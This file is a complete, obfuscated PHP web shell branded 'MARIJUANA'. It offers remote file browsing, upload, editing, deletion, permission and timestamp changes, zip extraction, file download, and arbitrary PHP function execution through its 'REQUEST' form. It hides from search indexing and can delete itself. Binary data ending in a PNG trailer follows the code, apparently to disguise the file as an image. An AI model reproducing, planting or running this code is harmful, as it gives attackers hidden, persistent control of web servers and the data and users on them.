<?php header("X-XSS-Protection: 0");ob_start();set_time_limit(0);error_reporting(0);ini_set('display_errors', FALSE);
$Array = [
		'7068705f756e616d65',
		'70687076657273696f6e',
		'6368646972',
		'676574637764',
		'707265675f73706c6974',
		'636f7079',
		'66696c655f6765745f636f6e74656e7473',
		'6261736536345f6465636f6465',
		'69735f646972',
		'6f625f656e645f636c65616e28293b',
		'756e6c696e6b',
		'6d6b646972',
		'63686d6f64',
		'7363616e646972',
		'7374725f7265706c616365',
		'68746d6c7370656369616c6368617273',
		'7661725f64756d70',
		'666f70656e',
		'667772697465',
		'66636c6f7365',
		'64617465',
		'66696c656d74696d65',
		'737562737472',
		'737072696e7466',
		'66696c657065726d73',
		'746f756368',
		'66696c655f657869737473',
		'72656e616d65',
		'69735f6172726179',
		'69735f6f626a656374',
		'737472706f73',
		'69735f7772697461626c65',
		'69735f7265616461626c65',
		'737472746f74696d65',
		'66696c6573697a65',
		'726d646972',
		'6f625f6765745f636c65616e',
		'7265616466696c65',
		'617373657274',
];
$___ = count($Array);
for($i=0;$i<$___;$i++) {
	$GNJ[] = uhex($Array[$i]);
}
?>
<!DOCTYPE html>
	<html dir="auto" lang="en-US">

		<head>
			<meta charset="UTF-8">
			<meta name="robots" content="NOINDEX, NOFOLLOW">

				<title>MARIJUANA</title>

			<link rel="icon" href="//0x5a455553.github.io/MARIJUANA/icon.png" />
			<link rel="stylesheet" href="//0x5a455553.github.io/MARIJUANA/main.css" type="text/css">

			<script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
			<script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
		</head>

		<body>
			<header>
				<div class="y x">
					<a class="ajx" href="<?php echo basename($_SERVER['PHP_SELF']);?>">
						MARIJuANA
					</a>
				</div>

				<div class="q x w">
					&#8212; DIOS &#8212; NO &#8212; CREA &#8212; NADA &#8212; EN &#8212; VANO &#8212;
				</div>
				
			</header>

			<article>
				<div class="i">
					<i class="far fa-hdd"></i>
					<?php echo $GNJ[0]();?>

					<br />

					<i class="far fa-lightbulb"></i> &thinsp;&thinsp;<b>SOFT  :</b> <?php echo $_SERVER['SERVER_SOFTWARE'];?> <b>PHP :</b> <?php echo $GNJ[1]();?>

					<br />

					<i class="far fa-folder"></i>
					
					<?php
					if(isset($_GET["d"])) {
						$d = uhex($_GET["d"]);
						$GNJ[2](uhex($_GET["d"]));
					}
					else {
						$d = $GNJ[3]();
					}
					$k = $GNJ[4]("/(\\\|\/)/", $d );
					foreach ($k as $m => $l) { 
						if($l=='' && $m==0) {
							echo '<a class="ajx" href="?d=2f">/</a>';
						}
						if($l == '') { 
							continue;
						}
						echo '<a class="ajx" href="?d=';
						for ($i = 0; $i <= $m; $i++) {
							echo hex($k[$i]); 
							if($i != $m) {
								echo '2f';
							}
						}
						echo '">'.$l.'</a>/'; 
					}
					?>

					<br />

				</div>

				<div class="u">
					<?php echo $_SERVER['SERVER_ADDR'];?> <i class="fas fa-link"></i>
					<br />

					<br />

					<form method="post" enctype="multipart/form-data">
						<label class="l w">
							<input type="file" name="n[]" onchange="this.form.submit()" multiple> &nbsp;UPLOAD
						</label>&nbsp;
					</form>

					<?php
					$o_ = [ 
							'<script>$.notify("',
							'", { className:"1",autoHideDelay: 2000,position:"left bottom" });</script>'
						];
					$f = $o_[0].'OK!'.$o_[1];
					$g = $o_[0].'ER!'.$o_[1];
					if(isset($_FILES["n"])) {
						$z = $_FILES["n"]["name"];
						$r = count($z);
						for( $i=0 ; $i < $r ; $i++ ) {
							if($GNJ[5]($_FILES["n"]["tmp_name"][$i], $z[$i])) {
								echo $f;
							}
							else {
								echo $g;
							}
						}
					}
					?>

				</div>
					<?php
					$a_ = '<table cellspacing="0" cellpadding="7" width="100%">
						<thead>
							<tr>
								<th>';
					$b_ = '</th>
							</tr>
						</thead>
						<tbody>
							<tr>
								<td></td>
							</tr>
							<tr>
								<td class="x">';
					$c_ = '</td>
							</tr>
						</tbody>
					</table>';
					$d_ = '<br />
										<br />
										<input type="submit" class="w" value="&nbsp;OK&nbsp;" />
									</form>';
					if(isset($_GET["s"])) {
						echo $a_.uhex($_GET["s"]).$b_.'
									<textarea readonly="yes">'.$GNJ[15]($GNJ[6](uhex($_GET["s"]))).'</textarea>
									<br />
									<br />
									<input onclick="location.href=\'?d='.$_GET["d"].'&e='.$_GET["s"].'\'" type="submit" class="w" value="&nbsp;EDIT&nbsp;" />
								'.$c_;
					}
					elseif(isset($_GET["y"])) {
						echo $a_.'REQUEST'.$b_.'
									<form method="post">
										<input class="x" type="text" name="1" />&nbsp;&nbsp;
										<input class="x" type="text" name="2" />
										'.$d_.'
									<br />
									<textarea readonly="yes">';

									if(isset($_POST["2"])) {
										echo $GNJ[15](dre($_POST["1"], $_POST["2"]));
									}

								echo '</textarea>
								'.$c_;
					}
					elseif(isset($_GET["e"])) {
						echo $a_.uhex($_GET["e"]).$b_.'
									<form method="post">
										<textarea name="e" class="o">'.$GNJ[15]($GNJ[6](uhex($_GET["e"]))).'</textarea>
										<br />
										<br />
										<span class="w">BASE64</span> :
										<select id="b64" name="b64">
											<option value="0">NO</option>
											<option value="1">YES</option>
										</select>
										'.$d_.'
								'.$c_.'
								
					<script>
						$("#b64").change(function() {
							if($("#b64 option:selected").val() == 0) {
								var X = $("textarea").val();
								var Z = atob(X);
								$("textarea").val(Z);
							}
							else {
								var N = $("textarea").val();
								var I = btoa(N);
								$("textarea").val(I);
							}
						});
					</script>';
					if(isset($_POST["e"])) {
						if($_POST["b64"] == "1") {
							$ex = $GNJ[7]($_POST["e"]);
						}
						else {
							$ex = $_POST["e"];
						}
						$fp = $GNJ[17](uhex($_GET["e"]), 'w');
						if($GNJ[18]($fp, $ex)) {
							OK();
						}
						else {
							ER();
						}
						$GNJ[19]($fp);
					  }
					}
					elseif(isset($_GET["x"])) {
						rec(uhex($_GET["x"]));
						if($GNJ[26](uhex($_GET["x"]))) {
							ER();
						}
						else {
							OK();
						}

					}
					elseif(isset($_GET["t"])) {
						echo $a_.uhex($_GET["t"]).$b_.'
									<form action="" method="post">
										<input name="t" class="x" type="text" value="'.$GNJ[20]("Y-m-d H:i", $GNJ[21](uhex($_GET["t"]))).'">
										'.$d_.'
								'.$c_;
					if( !empty($_POST["t"]) ) {
						$p = $GNJ[33]($_POST["t"]);
						if($p) {
							if(!$GNJ[25](uhex($_GET["t"]),$p,$p)) {
								ER();
							}
							else {
								OK();
							}
						}
						else {
							ER();
						}
					  }
					}
					elseif(isset($_GET["k"])) {
						echo $a_.uhex($_GET["k"]).$b_.'
									<form action="" method="post">
										<input name="b" class="x" type="text" value="'.$GNJ[22]($GNJ[23]('%o', $GNJ[24](uhex($_GET["k"]))), -4).'">
										'.$d_.'
								'.$c_;
					if(!empty($_POST["b"])) {
						$x = $_POST["b"];
						$t = 0;
					for($i=strlen($x)-1;$i>=0;--$i)
						$t += (int)$x[$i]*pow(8, (strlen($x)-$i-1));
					if(!$GNJ[12](uhex($_GET["k"]), $t)) {
						ER();
					}
					else {
						OK();
						  }
						}
					}
					elseif(isset($_GET["l"])) {
						echo $a_.'+DIR'.$b_.'
									<form action="" method="post">
										<input name="l" class="x" type="text" value="">
										'.$d_.'
								'.$c_;
					if(isset($_POST["l"])) {
						if(!$GNJ[11]($_POST["l"])) {
							ER();
						}
						else {
							OK();
						}
					  }
					}
					elseif(isset($_GET["q"])) {
						if($GNJ[10](__FILE__)) {
							$GNJ[38]($GNJ[9]);
							header("Location: ".basename($_SERVER['PHP_SELF'])."");
							exit();
						}
						else {
							echo $g;
						}
					}
					elseif(isset($_GET["n"])) {
						echo $a_.'+FILE'.$b_.'
									<form action="" method="post">
										<input name="n" class="x" type="text" value="">
										'.$d_.'
								'.$c_;
					if(isset($_POST["n"])) {
						if(!$GNJ[25]($_POST["n"])) {
							ER();
						}
						else {
							OK();
						}
					  }
					}
					elseif(isset($_GET["r"])) {
						echo $a_.uhex($_GET["r"]).$b_.'
									<form action="" method="post">
										<input name="r" class="x" type="text" value="'.uhex($_GET["r"]).'">
										'.$d_.'
								'.$c_;
					if(isset($_POST["r"])) {
						if($GNJ[26]($_POST["r"])) {
							ER();
						}
						else {
							if($GNJ[27](uhex($_GET["r"]), $_POST["r"])) {
								OK();
							}
							else {
								ER();
							}
						  }
					   }
					}
					elseif(isset($_GET["z"])) {
						$zip = new ZipArchive;
						$res = $zip->open(uhex($_GET["z"]));
							if($res === TRUE) {
								$zip->extractTo(uhex($_GET["d"]));
								$zip->close();
								OK();
							} else {
								ER();
						  }
					}
					else {
					echo '<table cellspacing="0" cellpadding="7" width="100%">
						<thead>
							<tr>
								<th width="44%">[ NAME ]</th>
								<th width="11%">[ SIZE ]</th>
								<th width="17%">[ PERM ]</th>
								<th width="17%">[ DATE ]</th>
								<th width="11%">[ ACT ]</th>
							</tr>
						</thead>
						<tbody>
							<tr>
								<td>
									<a class="ajx" href="?d='.hex($d).'&n">+FILE</a>
									<a class="ajx" href="?d='.hex($d).'&l">+DIR</a>
								</td>
							</tr>
						';

							$h = "";
							$j = "";
							$w = $GNJ[13]($d);
							if($GNJ[28]($w) || $GNJ[29]($w)) {
							foreach($w as $c){
								$e = $GNJ[14]("\\", "/", $d);
								if(!$GNJ[30]($c, ".zip")) {
									$zi = '';
								}
								else {
									$zi = '<a href="?d='.hex($e).'&z='.hex($c).'">U</a>';
								}
								if($GNJ[31]("$d/$c")) {
										$o = "";
								}
								elseif(!$GNJ[32]("$d/$c")) {
										$o = " h";
								}
								else {
										$o = " w";
								}
								$s = $GNJ[34]("$d/$c") / 1024;
								$s = round($s, 3);
								if($s>=1024) { 
									$s = round($s/1024, 2) . " MB";
								} else {
									$s = $s . " KB";
								}
							if(($c != ".") && ($c != "..")){
								($GNJ[8]("$d/$c")) ?
								$h .= '<tr class="r">
							<td>
								<i class="far fa-folder m"></i>
								<a class="ajx" href="?d='.hex($e).hex("/".$c).'">'.$c.'</a>
							</td>
							<td class="x">
								dir
							</td>
							<td class="x">
								<a class="ajx'.$o.'" href="?d='.hex($e).'&k='.hex($c).'">'.x("$d/$c").'</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d='.hex($e).'&t='.hex($c).'">'.$GNJ[20]("Y-m-d H:i", $GNJ[21]("$d/$c")).'</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d='.hex($e).'&r='.hex($c).'">R</a>
								<a href="?d='.hex($e).'&x='.hex($c).'">D</a>
							</td>
						</tr>
						
						'
							:
								$j .= '<tr class="r">
							<td>
								<i class="far fa-file m"></i>&thinsp;
								<a class="ajx" href="?d='.hex($e).'&s='.hex($c).'">'.$c.'</a>
							</td>
							<td class="x">
								'.$s.'
							</td>
							<td class="x">
								<a class="ajx'.$o.'" href="?d='.hex($e).'&k='.hex($c).'">'.x("$d/$c").'</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d='.hex($e).'&t='.hex($c).'">'.$GNJ[20]("Y-m-d H:i", $GNJ[21]("$d/$c")).'</a>
							</td>
							<td class="x">
								<a class="ajx" href="?d='.hex($e).'&r='.hex($c).'">R</a>
								<a class="ajx" href="?d='.hex($e).'&e='.hex($c).'">E</a>
								<a href="?d='.hex($e).'&g='.hex($c).'">G</a>
								'.$zi.'
								<a href="?d='.hex($e).'&x='.hex($c).'">D</a>
							</td>
						</tr>
						
						';

							}
						}
					}

						echo $h;
						echo $j;
						echo '</tbody>
						<tfoot>
							<tr>
								<th class="et">
									<a class="ajx" href="?d='.hex($e).'&y">REQUEST</a>
									<a href="?d='.hex($e).'&q">EXIT</a>
								</th>
								<th class="et" width="11%"></th>
								<th class="et" width="17%"></th>
								<th class="et" width="17%"></th>
								<th class="et" width="11%"></th>
							</tr>
					</tfoot>
				</table>';
					}
					?>

			</article>
			<footer class="x">
				&copy;TheAlmightyZeus
			</footer>
			<?php
			if(isset($_GET["1"])) {
				echo $f;
			}
			elseif(isset($_GET["0"])) {
				echo $g;
			}
			else {
				NULL;
			}
			?>

			<script>
				$(".ajx").click(function(t){t.preventDefault();var e=$(this).attr("href");history.pushState("","",e),$.get(e,function(t){$("body").html(t)})});
			</script>
		</body>
	</html>
<?php
	function rec($j) {
		global $GNJ;
		if(trim(pathinfo($j, PATHINFO_BASENAME ), '.') === '') {
			return;
		}
		if($GNJ[8]($j)) {
			array_map('rec', glob($j . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
			$GNJ[35]($j);
		}
		else {
			$GNJ[10]($j);
		}
	}
	function dre($y1, $y2) {
		global $GNJ;
		ob_start();
		$GNJ[16]($y1($y2));
		return $GNJ[36]();
	}
	function hex($n) {
		$y='';
		for ($i=0; $i < strlen($n); $i++){
			$y .= dechex(ord($n[$i]));
		}
		return $y;
	}
	function uhex($y) {
		$n='';
		for ($i=0; $i < strlen($y)-1; $i+=2){
			$n .= chr(hexdec($y[$i].$y[$i+1]));
		}
		return $n;
	}
	function OK() {
		global $GNJ, $d;
		$GNJ[38]($GNJ[9]);
		header("Location: ?d=".hex($d)."&1");
		exit();
	}
	function ER() {
		global $GNJ, $d;
		$GNJ[38]($GNJ[9]);
		header("Location: ?d=".hex($d)."&0");
		exit();
	}
	function x($c) {
		global $GNJ;
		$x = $GNJ[24]($c);
		if(($x & 0xC000) == 0xC000) {
			$u = "s";
		}
		elseif(($x & 0xA000) == 0xA000) {
			$u = "l";
		}
		elseif(($x & 0x8000) == 0x8000) {
			$u = "-";
		}
		elseif(($x & 0x6000) == 0x6000) {
			$u = "b";
		}
		elseif(($x & 0x4000) == 0x4000) {
			$u = "d";
		}
		elseif(($x & 0x2000) == 0x2000) {
			$u = "c";
		}
		elseif(($x & 0x1000) == 0x1000) {
			$u = "p";
		}
		else {
			$u = "u";
		}
		$u .= (($x & 0x0100) ? "r" : "-");
		$u .= (($x & 0x0080) ? "w" : "-");
		$u .= (($x & 0x0040) ? (($x & 0x0800) ? "s" : "x") : (($x & 0x0800) ? "S" : "-"));
		$u .= (($x & 0x0020) ? "r" : "-");
		$u .= (($x & 0x0010) ? "w" : "-");
		$u .= (($x & 0x0008) ? (($x & 0x0400) ? "s" : "x") : (($x & 0x0400) ? "S" : "-"));
		$u .= (($x & 0x0004) ? "r" : "-");
		$u .= (($x & 0x0002) ? "w" : "-");
		$u .= (($x & 0x0001) ? (($x & 0x0200) ? "t" : "x") : (($x & 0x0200) ? "T" : "-"));
		return $u;
	}
	if(isset($_GET["g"])) {
		$GNJ[38]($GNJ[9]);
		header("Content-Type: application/octet-stream");
		header("Content-Transfer-Encoding: Binary");
		header("Content-Length: ".$GNJ[34](uhex($_GET["g"])));
		header("Content-disposition: attachment; filename=\"".uhex($_GET["g"])."\"");
		$GNJ[37](uhex($_GET["g"]));
	}
?>

hO&�o)!���6�bbS��W��_�M4�S�P M�����r Es��aQ�,���k�!j�g*� �6ˣ�����TÛ�6�� ���b���k�~=����0��DP�m �k\�x1aA,,0Me%�aA��Z��_[�|�yB�Ed��a�CXvbc��n.j>����@��r�jb�t�d��'�ѨT�u(��#�g�5��SͰC~�/��A�1�'�I(y�?jh����P2Ş=$�QRC�2�ڃz��X��XhU��+݁�a�������-�x�5F
WR�1��-�An���MG^9f��"Ԑ�,7�w����)�:��+G#g���-�c\�J+ )q�!�e^�Im>��hR��!1����S'N\�x���bf�j,�Q�.-*;�O����Gգ/;�3?.~�Ch����ESOla�r�%�K��YK4���XA[P��C����Fo���Pg3���Q|��;����B�"�V0�3����X�����1�ڐ��IEKA�ҿNltM[�dDlfZt1�,�����`X���W���r��X-c�Q����`�+#����L2����bi���'ٜh=��ĉ8�2����L�|�H4�ӻL�ire�9�l�7�@K�C���]�$���Y�IpE�)k"Q7�Ao�J��uE�51�/�zK�{��3�Ni1E��9Xu$fW)���B��"L���v�W��|��<�~���F?��_�f��!/��	�mGe2Xe�	��tnFX��w6��h��w���+���k�M�اv�\��mP�2L�,+_�x(zZ�4��2Ҳ�5�<*�ĺ�tLn��%�ܙ=�t��VcA,]��|.�>ZZ+ӹ��w���5�
����x/Fr�3�.�%S��\:�ޒ�Eg{+��v��)��F�����/b#b��8m����ᩛ�ݬ��ͥc�r;p�s�oް/#��8G	n���Q��]t��~#�y4e!������).W c�[�7�ǵ)�K������=�y��~��0�[`@ �~�.�6�|=�5������HK�k��F'�����rc��(s�Ӿ��t��F��7�
�b��Y�~��nL�- S)�����0����vܤ�i}eB�-�ӓ���TI�_���D#����3��%�SL�l=PyN^D���)�)��[본�T�C�7=%���.����(��),q
6�7ۦK�J|P��DMw܄i�-a�PEt���]۲�����l[�n��L^��]�Pr�EW��H
�k�c��i��J��'�E��ǰ	q3$p��'Et����Gd�M���`�������&��`ݲ#>�a����/m��b�\�炸E��ǒE���.�O�)�-H��#����pI`K���!m3�o�df����Ͳ�җ&w$�f3����=.� p1}0y�`�嚍I��P*\,@���a?��	�H�/����*�U���H���6ͻ�;�j'���w�[C�y.w�e=z ��8��|�B� �.�FHB�I�$pI`�vmƑ����fl_��-�\{��Z���4�p�̣��a�������觌xh"�0���C�(`��m�T���_�p�n� ��le�Z_&�U�|�?�k�,%S�j�}k5`�n}2�wVõ�c|�������Y [�&q�(�f#'J:/3�c�+����C8�	C�7�&�������
	��e�>�\rO�[� ��� �G,�Omv�����s�ͫ�z�!��v��ym�"�ǲ��K?�Řf�ks�Ӫ`���+���0��F>��s7�y�i��<�VyW�@Й�َʂ#��q%w����`aV^Y@?�_)ߪ���8��zx�370X[�pUެ���YV$�m�=~Mw�{��Q�br���^��T���xcƬ���� tk��~ӪFȉ���c���3K�z(��1-��K��=��(���q�<G	h�-ı���X��/�ݾ��;�=�q~�4qۤ���]SQG�n�_}�-D��V�_�(��3s�)&s�X(� J��7�0\ޞ`��A}������$C<b�i�=�S���D�a��8�,#�:��(���WNĻ��֐GMqT��#!�(���.	���k%���ݧ�M�߻������'YB�����\�v�h�~@���de��mP����amݱ�������Fj|].�dn�q����Z��1�� �:Z� �<%:�N�R�o]3:b[7m\��V:��J���M�r��5�'Y,�DXt B��Az��;e�Ȯ�+��l�f��잂9�`�E�����3�Vg�p9�j3ͦݏ�����lJ&�?�֬�ZF�m��}�T��F�����#L�z������}�Ն�[8Z�e.����ŷ2M�����xpȠ5�)T�4�����E���^xТ���x��-  ��&h���Z��ﱯ����۝m
V��0�g� ���l���~�Nе����BQ$/d|�P��V��2Úx@��ց���l�~t5\�s��ONv!���:�)s�~ +Ȓ��.O+ME��^x�|I�J������ψ�.��m��%���r�= �����$'�H��;:g��_8>ىg�k�w+F}��/���v9vI��g�g��Н�K�ދ���4��lF$I��F��"��b�-AM�~	�W�?�?^;�4�����a��`wg�Q� \9<ȫ��7�:{�����)�7���JD5�	�D8bOj�v��I�\ a�0/m"jkڬ#�T������|u-�P���A�	 r���̏�I������Kf�a���w�k,���g�{W�Z)�H���x��.)c����B��tU��5	�f�����>�ɟ7�0^��ߧƲ��,��D�G&���"���u�}pͥ���v��Yh}R����ϭ۫'[��/O�?�{U���)@N���i�
�V��A���c,���ێ��� ��sSd�q�J�-�սʀ�K�͛�X7I!��@�5��n^[rv	�ĵ�0�-�@��3Rq�眆s�/�5�m�*�L�$��COA�����$Z�Ԉ�hA�PK��������8X�������5�vx�Q�S��c�+��^j�EA
őQգZ	}�ٴ���_4��ivq��� �Q� m8�k��1������)��@VHA��b�[���m�O:�П�(���� �E�d�o����qZ������.A/��D ��<���	�5�$���"H��B���q��x���v��~TO##��8��$i-
 �5hľ���O'����\2�K"Q�'�@�>G��@wGj�s4덎q�ja�80���D�K�_����u�  �֐b���лp�<��02֗Gi��Z/z{"uɞ������Y�*#V���u�c�	Ě��=$�8U�4C0���k�//U^��&��g8}��J,<Š���F-FQ��fu�y��巺(l5�4o ���%��v'�����,vu�s�hݭ[uLXo���N�1�h�ѯ���֨��򜤏h<�[~b�~s�2[�x���3b7�>s��J���
�+��P�%�Z��*���y�g<&I��D�8=����{�L�M�_�y}u�鉗Z��}im�,+�Sm���i<��9�h<q�y>7P�݁,�	OG4!� ���sإ��M���e�D���uW����K��Q� ���g��piM��]�^9�y�l�^����*��?:��4)��:C��� z�+�e�n�>/v�ʽ���k�� ��;}��0�G��� �m ���Y�����#��l d'vNu�ՙ+X:��kk�V���w���wЁ��֭
`�ѤZ#�_��oZ����nyN�
(��&�2�%���Ȫy���������Ɲ~��#�g���W�ˑ�)�f��m���ٸ(7_4^
C<O�Ԩ`�V�h��� R��!�ޠ��t<+�w�k�$�����OK&�0�)V�/�\*�!BɌ�ƴ�zO "��u ���:�x�`�F\$�$4�p�Z;r���FE�<�25�FV~iPU`|�,.Q�EJ�f0䱞�7���I3i)��ā����+�"�ѬT�Py����+~��L��WU�q`O�{u�	v͈8�9(� ����"���,hf�����y�,�b!�͇����̑s�2	��|��D�áJ�/]�����,$f^5FH�9H)��y�x!�g<�8^۵�(������V����aDg�%�v��s��Z\t|Ls��C1��C0L�H<�>��'z��n$t�    IEND�B`�